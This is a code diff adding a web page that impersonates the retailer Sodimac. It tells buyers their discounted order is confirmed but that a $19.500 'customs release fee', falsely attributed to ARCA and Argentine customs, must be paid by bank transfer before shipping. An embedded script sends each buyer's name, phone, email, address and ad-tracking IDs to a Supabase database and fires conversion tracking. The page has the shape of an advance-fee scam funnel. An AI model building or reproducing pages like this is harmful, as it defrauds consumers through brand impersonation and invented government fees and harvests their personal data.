@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="es-AR">
+
+<head>
+<script src="/js/site-utils.js"></script>
+<script>window.addEventListener("load",function(){try{window.trackFbOrderPurchase&&window.trackFbOrderPurchase("pedido-upsell1");}catch(e){}});</script>
+<script src="/js/funnel-events.js"></script>
+<script>window.addEventListener('load',function(){try{window.trackFunnelEventOnce&&window.trackFunnelEventOnce('upsell_reached');}catch(e){}});</script>
+  <script>
+/* ---- Tarjeta (Clip) aprobada: URL de éxito = up1. Marca pedido PAGADO en Supabase + conversión xTracky.
+   Guard metodoPago==='card' → el cliente SPEI (que ya disparó en el comprobante) se ignora aquí. ---- */
+(function () {
+  try {
+    var order = null;
+    try { order = JSON.parse(localStorage.getItem('foldease-order') || 'null'); } catch (e) {}
+    if (!order || order.metodoPago !== 'card') return;
+
+    var oid = localStorage.getItem('xtracky_card_order_id');
+    if (!oid) { oid = 'mx-ttshop-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8); }
+    if (localStorage.getItem('xtracky_card_done') === oid) return; /* ya disparado para esta compra */
+    try { localStorage.setItem('xtracky_card_done', oid); } catch (e) {} /* dedup: refresh/back no re-cuenta */
+
+    var _sbqs = ''; try { _sbqs = localStorage.getItem('xtracky_card_qs') || ''; } catch (e) {}
+    var _sp = new URLSearchParams(_sbqs || location.search);
+    var _u = function (k) { return _sp.get(k) || null; };
+
+    /* ---- Supabase: pedido PAGADO (tarjeta) para que aparezca en el panel ---- */
+    var SB_URL = 'https://oorzpkzwjtsjsvvjqqih.supabase.co';
+    var SB_KEY = 'sb_publishable_8h76Y4nOvNs9sq8O35EtDQ_PQ0vFxY4';
+    fetch(SB_URL + '/rest/v1/orders', {
+      method: 'POST', keepalive: true,
+      headers: { apikey: SB_KEY, Authorization: 'Bearer ' + SB_KEY, 'Content-Type': 'application/json', Prefer: 'return=minimal' },
+      body: JSON.stringify({
+        site: 'ttshop-arg',
+        status: 'pago',
+        nombre: order.nombre || null, telefono: order.telefono || null, email: order.email || null,
+        direccion: order.direccion || null, colonia: order.colonia || null, ciudad: order.ciudad || null,
+        estado: order.estado || null, codigo_postal: order.codigoPostal || null,
+        metodo_pago: 'card', producto: order.producto || null, slug: order.slug || null, color: order.color || null,
+        total: Number(order.total) || 0, attempt_number: 'card-aprobado',
+        utm_source: _u('utm_source'), utm_medium: _u('utm_medium'), utm_campaign: _u('utm_campaign'),
+        utm_content: _u('utm_content'), utm_term: _u('utm_term'),
+        ttclid: _u('ttclid'), fbclid: _u('fbclid'), gclid: _u('gclid'),
+        referrer: document.referrer || null, landing_url: location.href
+      })
+    }).catch(function () {});
+
+  } catch (e) {}
+})();
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sodimac — Tasa de Liberación Aduanera</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            margin: 0;
+            min-height: 100vh;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Inter", "Roboto", sans-serif;
+            background: #f4f4f5;
+            color: #27272a;
+        }
+        .topbar {
+            background: #fff;
+            border-bottom: 1px solid #e4e4e7;
+            padding: 14px 16px;
+            text-align: center;
+        }
+        .topbar img { height: 34px; width: auto; }
+
+        .container {
+            max-width: 460px;
+            width: 100%;
+            background: #fff;
+            border-radius: 18px;
+            padding: 26px 20px 28px;
+            margin: 22px auto;
+            box-shadow: 0 10px 30px rgba(0,0,0,.06);
+        }
+
+        .badge {
+            display: inline-block;
+            border: 1px solid #bbf7d0;
+            background: #f0fdf4;
+            color: #15803d;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: .12em;
+            padding: 9px 16px;
+            border-radius: 999px;
+        }
+        .head { text-align: center; }
+        .head h1 {
+            font-size: 30px;
+            font-weight: 800;
+            color: #d52b1e;
+            margin: 18px 0 14px;
+        }
+        .head p {
+            font-size: 16px;
+            line-height: 1.6;
+            color: #3f3f46;
+            margin: 0 0 20px;
+        }
+        .head p strong { color: #d52b1e; }
+
+        .tax-box {
+            background: #fafafa;
+            border: 1px solid #e4e4e7;
+            border-radius: 14px;
+            padding: 18px 16px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .tax-box-title {
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: .08em;
+            text-transform: uppercase;
+            color: #71717a;
+        }
+        .amount-value {
+            font-size: 40px;
+            font-weight: 800;
+            margin: 10px 0 4px;
+            color: #d52b1e;
+        }
+        .amount-sub { font-size: 13px; color: #71717a; }
+
+        .button {
+            width: 100%;
+            border: 0;
+            border-radius: 999px;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            color: #fff;
+            background: #d52b1e;
+            box-shadow: 0 10px 24px rgba(213,43,30,.28);
+        }
+        .button:active { transform: scale(.99); }
+        .button-hint { text-align: center; font-size: 13px; color: #71717a; margin-top: 10px; }
+
+        .info-box {
+            background: #fefce8;
+            border: 1px solid #fde68a;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 14.5px;
+            line-height: 1.6;
+            color: #3f3f46;
+            margin-top: 22px;
+        }
+        .info-box .info-title {
+            font-weight: 700;
+            color: #d52b1e;
+            margin-bottom: 8px;
+        }
+        .info-box strong { color: #d52b1e; }
+
+        .pay-chip {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 18px auto 0;
+            padding: 10px 18px;
+            background: #f4f4f5;
+            border-radius: 999px;
+            font-size: 14.5px;
+            font-weight: 700;
+            color: #3f3f46;
+            width: fit-content;
+        }
+        .foot {
+            text-align: center;
+            font-size: 12.5px;
+            letter-spacing: .1em;
+            color: #a1a1aa;
+            margin: 18px 0 30px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="topbar">
+        <img src="/__l5e/assets-v1/58a5a796-ad43-4024-a4e9-0a9458c634be/sodimac-pago-logo.png" alt="Sodimac">
+    </div>
+
+    <div class="container">
+        <div class="head">
+            <span class="badge">● PEDIDO CONFIRMADO</span>
+            <h1>¡Felicitaciones!</h1>
+            <p>
+                Acabás de garantizar tu descuento a través de <strong>Sodimac</strong>!
+                Para concluir, solo falta realizar el pago de la <strong>Liberación Aduanera</strong> de tu producto.
+            </p>
+        </div>
+
+        <div class="tax-box">
+            <div class="tax-box-title">Tasa de Liberación Aduanera (ARCA · Aduana)</div>
+            <div class="amount-value">$19.500</div>
+            <div class="amount-sub">Pago único · Pesos argentinos</div>
+        </div>
+
+        <button class="button" onclick="redirectToCheckout()">
+            Generar CVU para Pago &nbsp;→
+        </button>
+        <div class="button-hint">Vas a pagar al CVU o Alias generado</div>
+
+        <div class="info-box">
+            <div class="info-title">⚠ Información importante</div>
+            Para liberar el envío de <strong>tu pedido</strong>, es necesario abonar la
+            <strong>Tasa de Liberación Aduanera</strong> por un valor de <strong>$19.500</strong>.
+            Esta tasa cubre los gastos de importación, despacho a plaza y verificación aduanera exigidos por
+            <strong>ARCA (ex AFIP)</strong> y la <strong>Aduana Argentina</strong> para el ingreso de la mercadería al país.
+            <strong>Sin el pago, la liberación no se completa y tu producto no puede ser enviado.</strong>
+        </div>
+
+        <div class="pay-chip">▭ Transferencia bancaria · CVU/Alias</div>
+    </div>
+
+    <div class="foot">SITIO SEGURO · SSL · SODIMAC</div>
+
+    <script>
+        function redirectToCheckout() {
+            window.location.href = getUrlWithUtm("/up1-pago.html");
+        }
+    </script>
+</body>
+
+</html>
+
